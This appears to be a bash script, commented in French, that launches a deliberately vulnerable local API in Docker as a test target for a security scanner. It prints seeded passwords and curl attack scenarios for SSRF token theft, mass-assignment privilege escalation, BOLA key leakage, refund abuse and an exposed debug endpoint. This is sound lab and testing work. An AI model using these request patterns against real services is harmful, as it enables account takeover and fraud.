#!/usr/bin/env bash
# CSM — API « Customer Success Management » DÉLIBÉRÉMENT VULNÉRABLE (locale).
# Construit l'image légère examples/targets/csm/ et la lance. Mode adversarial
# pour HAR-ZAP : BOLA, mass assignment, SSRF (avec rebond interne), JWT alg=none,
# business-flow, shadow endpoint. Voir examples/targets/csm/README.md.
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"; source "$HERE/lib.sh"
NAME=${NAME:-csm}; PORT=${PORT:-5005}
need_docker
log "Build image CSM (python-alpine, stdlib pur)"
docker build -q -t harzap-csm "$HERE/csm" >/dev/null
log "Démarrage CSM"
docker rm -f "$NAME" >/dev/null 2>&1 || true
docker run -d --name "$NAME" -p "127.0.0.1:${PORT}:5000" harzap-csm >/dev/null
on_cleanup "docker rm -f $NAME >/dev/null 2>&1"
wait_http "http://localhost:${PORT}/" '^200$' 20 1 || exit 1
curl -sS -m5 -X POST "http://localhost:${PORT}/createdb" >/dev/null && info "  base peuplée (/createdb)"
BASE="http://localhost:${PORT}"
log "Prêt"
info "Base URL : $BASE"
cat <<TIP

Comptes seedés : alice/alice123 · bob/bob123 · carol/carol123 (manager) · admin/admin123
Scénarios (voir README) :
  A. SSRF -> interne -> admin :
     TOK=\$(curl -s $BASE/auth/login -d '{"username":"alice","password":"alice123"}' -H 'Content-Type: application/json' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
     SVC=\$(curl -s $BASE/webhooks/test -H "Authorization: Bearer \$TOK" -H 'Content-Type: application/json' -d '{"url":"http://localhost:5000/internal/metadata"}' | python3 -c 'import sys,json;print(json.loads(json.load(sys.stdin)["body"])["service_token"])')
     curl -s $BASE/admin/users -H "X-Service-Token: \$SVC"
  B. Mass assignment -> escalade :   curl -s -X PATCH $BASE/me -H "Authorization: Bearer \$TOK" -H 'Content-Type: application/json' -d '{"role":"admin"}'
  C. BOLA -> clé API -> takeover :    curl -s $BASE/users/4 -H "Authorization: Bearer \$TOK"   # fuite AK-admin-999
  D. Business-flow (remboursement) :  curl -s -X POST $BASE/invoices/1/refund -H "Authorization: Bearer \$TOK" -H 'Content-Type: application/json' -d '{"amount":99999}'
  E. Shadow/debug :                   curl -s $BASE/debug/config
TIP
[ "${KEEP:-0}" = "1" ] || read -rp $'\nEntrée pour arrêter... ' _ || true
